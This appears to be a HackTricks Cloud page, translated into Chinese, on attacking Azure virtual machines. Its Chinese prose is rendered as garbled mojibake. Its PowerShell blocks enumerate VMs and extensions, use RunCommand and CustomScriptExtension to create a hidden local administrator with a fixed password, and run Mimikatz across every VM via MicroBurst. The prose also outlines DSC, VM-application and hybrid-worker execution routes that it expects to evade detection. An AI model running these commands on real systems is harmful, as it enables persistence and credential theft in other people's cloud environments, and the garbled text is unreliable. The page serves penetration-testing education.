# Az - è™šæ‹Ÿæœº

<details>

<summary><strong>æ”¯æŒ HackTricks å¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—® PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDFï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹ PEASS å’Œ HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥**åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

## åŸºæœ¬ä¿¡æ¯

Azure è™šæ‹Ÿæœºæ˜¯ Azure æä¾›çš„å‡ ç§[æŒ‰éœ€å¯æ‰©å±•çš„è®¡ç®—èµ„æº](https://learn.microsoft.com/en-us/azure/architecture/guide/technology-choices/compute-decision-tree)ä¹‹ä¸€ã€‚é€šå¸¸ï¼Œå½“æ‚¨éœ€è¦æ¯”å…¶ä»–é€‰æ‹©æä¾›çš„è®¡ç®—ç¯å¢ƒæ›´å¤šçš„æ§åˆ¶æƒæ—¶ï¼Œæ‚¨ä¼šé€‰æ‹©è™šæ‹Ÿæœºã€‚æœ¬æ–‡æä¾›äº†æœ‰å…³åœ¨åˆ›å»ºè™šæ‹Ÿæœºä¹‹å‰åº”è€ƒè™‘çš„äº‹é¡¹ã€å¦‚ä½•åˆ›å»ºè™šæ‹Ÿæœºä»¥åŠå¦‚ä½•ç®¡ç†è™šæ‹Ÿæœºçš„ä¿¡æ¯ã€‚

## æšä¸¾
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```
## **åœ¨è™šæ‹Ÿæœºä¸­è¿è¡Œå‘½ä»¤**

### **åœ¨è™šæ‹Ÿæœºä¸­è¿›è¡ŒAADç™»å½•**

å¯ä»¥å…è®¸é€šè¿‡AzureADè¿›è¡Œèº«ä»½éªŒè¯çš„ç”¨æˆ·è®¿é—®ã€‚ä¾‹å¦‚ï¼Œå°è¯•è®¿é—®**Linuxè™šæ‹Ÿæœº**ï¼š`ssh username@azure-corp.com@1.1.1.1`ï¼ˆåœ¨å°è¯•ç™»å½•æ—¶ï¼Œä½¿ç”¨ä¸azurecorpç›¸å…³çš„ç”µå­é‚®ä»¶æ˜¯å¾ˆé‡è¦çš„ï¼‰ï¼Œå¯èƒ½ä¼šå‡ºç°ä»¥ä¸‹é”™è¯¯ï¼š

{% code overflow="wrap" %}
```
(username@azure-corp.com@1.1.1.1) This preview capability is not for production use. When you sign in, verify the name of the app on the sign-in screen is "Azure Linux VM Sign-in" and the IP address of the target VM is correct.

To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code DT4PNSTGR to authenticate. Press ENTER when ready.
```
{% endcode %}

åªéœ€æŒ‰ç…§ä»¥ä¸‹è¯´æ˜å‰å¾€[https://microsoft.com/devicelogin](https://microsoft.com/devicelogin)ï¼Œè¾“å…¥ä»£ç ï¼Œä½¿ç”¨ç”µå­é‚®ä»¶å’Œå¯†ç ä½œä¸ºå‡­æ®ï¼Œå³å¯é€šè¿‡SSHè¿æ¥ï¼ˆå¦‚æœè¯¥ç”¨æˆ·å…·æœ‰è¶³å¤Ÿçš„æƒé™ï¼š`Virtual Machine Administrator Login`æˆ–`Virtual Machine User Login`è§’è‰²ï¼‰ã€‚

### **è¿è¡Œå‘½ä»¤**
```powershell
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' â€“Verbose
## Another way
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' â€“Verbose

# Content of the script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
### **è¿è¡Œè‡ªå®šä¹‰è„šæœ¬æ‰©å±•**

Azureè™šæ‹Ÿæœºï¼ˆVMï¼‰æ‰©å±•æ˜¯åœ¨Azure VMä¸Šæä¾›éƒ¨ç½²åé…ç½®å’Œè‡ªåŠ¨åŒ–ä»»åŠ¡çš„å°å‹åº”ç”¨ç¨‹åºã€‚ä¾‹å¦‚ï¼Œå¦‚æœä¸€ä¸ªè™šæ‹Ÿæœºéœ€è¦è½¯ä»¶å®‰è£…ã€é˜²ç—…æ¯’ä¿æŠ¤æˆ–åœ¨å…¶ä¸­è¿è¡Œè„šæœ¬çš„èƒ½åŠ›ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨VMæ‰©å±•ã€‚

å› æ­¤ï¼Œå¦‚æœæ‚¨æœ‰å†™å…¥æƒé™ï¼Œæ‚¨å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ï¼š
```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```
### DesiredConfigurationState

**DesiredConfigurationState (DSC)** ç±»ä¼¼äº Ansibleï¼Œä½†å®ƒæ˜¯ PowerShell ä¸­çš„ä¸€ä¸ªå·¥å…·ï¼Œå…è®¸é€šè¿‡ä»£ç è®¾ç½®ä¸»æœºã€‚DSC åœ¨ Azure ä¸­æœ‰è‡ªå·±çš„æ‰©å±•ï¼Œå…è®¸ä¸Šä¼ **é…ç½®æ–‡ä»¶**ã€‚DSC [é…ç½®æ–‡ä»¶](https://docs.microsoft.com/en-us/powershell/dsc/getting-started/wingettingstarted?view=dsc-1.1#define-a-configuration-and-generate-the-configuration-document) å¯¹è¯­æ³•è¦æ±‚ä¸¥æ ¼ï¼Œä½† DSC æ‰©å±•éå¸¸å®¹æ˜“å—éª—ï¼Œåªè¦éµå¾ªä¸€å®šçš„æ ¼å¼ï¼Œå®ƒå°±ä¼š**ç›²ç›®æ‰§è¡Œä»»ä½•å‘½ä»¤**ï¼Œå¦‚å›¾ 5 æ‰€ç¤ºã€‚

<figure><img src="../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

å¯ä»¥é€šè¿‡ **Az PowerShell** å‡½æ•° [**`Publish-AzvmdscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration?view=azps-7.5.0) æ¥å®ç°ã€‚DSC æ‰©å±•éœ€è¦ä¸€ä¸ªå¸¦æœ‰**å‡½æ•°**çš„ **.PS1** æ–‡ä»¶ï¼Œå¹¶æ‰“åŒ…æˆ **.zip** æ–‡ä»¶ã€‚ç”±äºè¿™å®é™…ä¸Šä¸æ˜¯æ­£ç¡®çš„ DSC è¯­æ³•ï¼Œæ‰©å±•çš„çŠ¶æ€å°†æ˜¾ç¤ºä¸ºâ€œå¤±è´¥â€ï¼Œä½†ä»£ç å°†è¢«æ‰§è¡Œã€‚é—®é¢˜åœ¨äºè¯¥å‘½ä»¤æ²¡æœ‰è¾“å‡ºï¼Œå› ä¸ºçŠ¶æ€è¢«è¦†ç›–ä¸ºå¤±è´¥æ¶ˆæ¯ã€‚

### VM åº”ç”¨å®šä¹‰

[VM åº”ç”¨](https://docs.microsoft.com/en-us/azure/virtual-machines/vm-applications) èµ„æºæ˜¯ä¸€ç§å°†ç‰ˆæœ¬åŒ–åº”ç”¨ç¨‹åºé‡å¤éƒ¨ç½²åˆ° Azure VM çš„æ–¹æ³•ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨åˆ›å»ºäº†ä¸€ä¸ªç¨‹åºï¼Œå¹¶å°†å…¶ä½œä¸ºç‰ˆæœ¬ 1.0 éƒ¨ç½²åˆ°æ‰€æœ‰ Azure VMï¼Œä¸€æ—¦å°†ç¨‹åºæ›´æ–°ä¸º 1.1ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ç›¸åŒçš„ VM åº”ç”¨æ¥åˆ›å»ºå¦ä¸€ä¸ªå®šä¹‰ï¼Œå¹¶å°†æ›´æ–°æ¨é€åˆ°ä»»ä½• VMã€‚\
èƒ½å¤Ÿå°†åº”ç”¨ç¨‹åºæ¨é€åˆ° VM æ„å‘³ç€å®ƒæ˜¯å¦ä¸€ç§ä»£ç æ‰§è¡Œçš„é€”å¾„ã€‚è¿™ç§æ–¹æ³•çš„ç¼ºç‚¹æ˜¯è®¾ç½®åº”ç”¨ç¨‹åºå®šä¹‰[**éœ€è¦ä¸€äº›æ­¥éª¤**](https://docs.microsoft.com/en-us/azure/virtual-machines/vm-applications-how-to?tabs=portal)ï¼Œä½†å¯ä»¥ä½¿ç”¨ Az PowerShell ä¸­çš„ **`New-AzGalleryApplication`** å’Œ **`New-AzGalleryApplicationVersion`** å‘½ä»¤æ¥å®Œæˆã€‚

è¿™ç§æŠ€æœ¯åˆ©ç”¨äº†ä¸€ä¸ªåä¸ºâ€œVMAppExtensionâ€çš„**æ‰©å±•**ï¼Œå½“å°†åº”ç”¨ç¨‹åºåº”ç”¨åˆ° VM ä¸Šæ—¶ï¼Œå®ƒä¼šè‡ªåŠ¨å®‰è£…ã€‚è¯¥æ‰©å±•ä¼šå°†æ–‡ä»¶ä» URI ä¸‹è½½åˆ°ç£ç›˜ä¸Šï¼Œæ–‡ä»¶åä¸åº”ç”¨ç¨‹åºå®Œå…¨ç›¸åŒï¼Œè¿™æ„å‘³ç€å¦‚æœåº”ç”¨ç¨‹åºåç§°ä¸ºâ€œAzApplicationâ€ï¼Œç£ç›˜ä¸Šçš„æ–‡ä»¶ä¹Ÿè¢«ç§°ä¸ºâ€œAzApplicationâ€ï¼Œæ²¡æœ‰æ‰©å±•åã€‚è¿™è¦æ±‚åœ¨ [REST API è°ƒç”¨](https://docs.microsoft.com/en-us/rest/api/compute/gallery-application-versions/create-or-update) ä¸­é…ç½®â€œManageActionsâ€å­—æ®µä»¥ä½¿ç”¨é€‚å½“çš„æ‰©å±•åé‡å‘½ååº”ç”¨ç¨‹åºã€‚å¦‚æœä¸æƒ³è¿è¡Œæ•´ä¸ªåº”ç”¨ç¨‹åºï¼Œè¿˜å¯ä»¥é€šè¿‡æ»¥ç”¨ç›¸åŒçš„ REST API æ–¹æ³•ä¸­çš„ ManageActions å­—æ®µæˆ–é€šè¿‡ Azure é—¨æˆ·æ¥è¿è¡Œä»»æ„çš„ PowerShell å‘½ä»¤ã€‚è®¾ç½®å®Œæˆåï¼Œå®šä¹‰å°†ç±»ä¼¼äºå›¾ 8ã€‚

<figure><img src="../../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

è¿™ç§æ‰§è¡ŒæŠ€æœ¯å¾ˆæ…¢ï¼ˆæ‰§è¡Œåº”ç”¨ç¨‹åºæˆ–å‘½ä»¤å¤§çº¦éœ€è¦ 3-4 åˆ†é’Ÿï¼‰ï¼Œä½†ç”±äºå®ƒç›¸å¯¹è¾ƒæ–°ï¼Œæˆ‘ä¼šå¾ˆæƒŠè®¶æ˜¯å¦æœ‰ä»»ä½•ç‰¹å®šçš„æ£€æµ‹æ–¹æ³•ã€‚

ç”±äºå®ƒæ˜¯ä¸€ä¸ªæœ€ç»ˆæ‰§è¡Œçš„æ‰©å±•ï¼Œåº”ç”¨ç¨‹åºçš„å‰¯æœ¬ä½äº `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Downloads\`ï¼Œæ‰§è¡Œçš„çŠ¶æ€ä¿å­˜åœ¨ `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Status\`ã€‚

### æ··åˆå·¥ä½œç»„

[**æ··åˆå·¥ä½œç»„**](https://docs.microsoft.com/en-us/azure/automation/automation-hybrid-runbook-worker)ï¼ˆHWGï¼‰å…è®¸åœ¨é…ç½®çš„ HWG ä¸­çš„ Azure è™šæ‹Ÿæœºä¸Šè¿è¡Œè‡ªåŠ¨åŒ–å¸æˆ·ä¸­çš„é…ç½®çš„ **Runbook**ã€‚å†æ¬¡ï¼Œä½¿ç”¨æ‰©å±•åœ¨ VM ä¸Šéƒ¨ç½² Runbook ä»£ç ã€‚ç”±äºä½¿ç”¨äº†æ‰©å±•ï¼Œå‡­æ®æ— å…³ç´§è¦ï¼Œä»£ç å°†ä»¥ **SYSTEM** æˆ– root ç”¨æˆ·èº«ä»½æ‰§è¡Œã€‚

<figure><img src="../../.gitbook/assets/image (2) (5).png" alt=""><figcaption></figcaption></figure>

å¦‚æœä½¿ç”¨ Windows 10 VMï¼Œè¯·ç¡®ä¿å°† Runbook ä½œä¸º PowerShell ç‰ˆæœ¬ 5.1 è¿è¡Œï¼Œè€Œä¸æ˜¯ 7.1ï¼Œå› ä¸ºé»˜è®¤æƒ…å†µä¸‹ VM ä¸Šæ²¡æœ‰å®‰è£… 7.1ï¼Œè„šæœ¬å°†æ— æ³•è¿è¡Œã€‚

## å‚è€ƒèµ„æ–™

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)

<details>

<summary><strong>æ”¯æŒ HackTricks å¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨å¸Œæœ›åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—® PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ PDF æ ¼å¼çš„ HackTricksï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹ PEASS å’Œ HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶ [**NFT**](https://opensea.io/collection/the-peass-family) é›†åˆ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨ **Twitter** ä¸Šå…³æ³¨æˆ‘ ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
